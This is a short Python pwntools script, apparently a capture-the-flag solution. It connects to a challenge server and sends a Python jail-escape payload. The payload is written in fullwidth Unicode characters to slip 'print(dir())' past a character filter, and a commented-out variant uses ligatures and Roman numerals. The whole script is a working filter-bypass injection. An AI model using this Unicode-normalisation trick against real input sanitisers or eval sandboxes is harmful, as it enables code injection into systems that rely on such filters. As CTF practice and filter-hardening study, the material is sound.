from pwn import *
import base64  
server_ = remote("misc.1nf1n1ty.team", 30010)
print(server_.recv(1024))
payload = "ｐｒｉｎｔ(ｄｉｒ())"
# payload = "ｉｎｔ(ﬃⅳⅥⅺﬅⅳⅨ)"
print(payload)
server_.sendline(payload)
print(server_.interactive())